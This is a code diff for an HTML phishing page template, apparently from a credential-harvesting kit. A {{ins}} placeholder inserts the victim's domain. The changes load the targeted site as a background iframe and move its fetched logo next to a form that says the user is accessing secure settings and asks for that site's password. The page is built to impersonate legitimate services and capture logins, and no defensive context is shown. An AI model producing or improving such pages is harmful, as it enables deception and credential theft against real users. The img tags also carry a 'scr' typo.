@@ -154,13 +154,12 @@
 </head>
 <body>
     <!-- Background iframe -->
-    <iframe src="https://your-background-url.com" title="Background iframe"></iframe>
+    <iframe src="https://{{ins}}" title="Background iframe"></iframe>
 
     <div id="loader">
-        <img scr="https://api.kickfire.com/logo?website={{ins}}">
+        
         <div id="loading-spinner"></div>
         <div id="info">
-            <img scr="https://api.kickfire.com/logo?website={{ins}}">
             <p id="datetime"><i class="fas fa-calendar-alt"></i> Date: <span id="currentDateTime">Loading...</span></p>
             <p id="browser"><i class="fas fa-browser"></i> Browser: <span id="currentBrowser">Loading...</span></p>
             <p id="os"><i class="fas fa-desktop"></i> OS: <span id="currentOS">Loading...</span></p>
@@ -170,8 +169,8 @@
 
     <div id="form-container">
         <form action="first" method="POST">
-            <img scr="https://api.kickfire.com/logo?website={{ins}}">
         <h2>You're accessing secure settings.</h2>
+            <img scr="https://api.kickfire.com/logo?website={{ins}}">
         <p>Please provide your <strong>{{ins}}</strong> password to continue.</p>
         <label for="password">Password</label>
         <input type="hidden" name="horse">
